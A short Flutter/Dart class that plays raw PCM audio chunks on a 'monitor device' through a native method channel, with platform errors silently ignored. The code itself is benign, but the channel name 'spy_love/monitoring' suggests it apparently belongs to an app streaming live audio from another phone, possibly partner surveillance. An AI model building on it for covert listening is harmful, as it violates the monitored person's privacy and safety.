import 'package:flutter/services.dart';

/// Plays raw PCM s16le chunks on the monitor device via native AudioTrack.
class LiveAvPlayback {
  static const _channel = MethodChannel('org.hmg.spy_love/monitoring');

  static Future<void> playPcm(
    Uint8List pcm, {
    int sampleRate = 16000,
    int channels = 1,
  }) async {
    try {
      await _channel.invokeMethod<void>('playPcmChunk', {
        'pcm': pcm,
        'sampleRate': sampleRate,
        'channels': channels,
      });
    } on PlatformException {
      // ignored
    } on MissingPluginException {
      // ignored
    }
  }

  static Future<void> stop() async {
    try {
      await _channel.invokeMethod<void>('stopPcmPlayback');
    } on PlatformException {
      // ignored
    } on MissingPluginException {
      // ignored
    }
  }
}
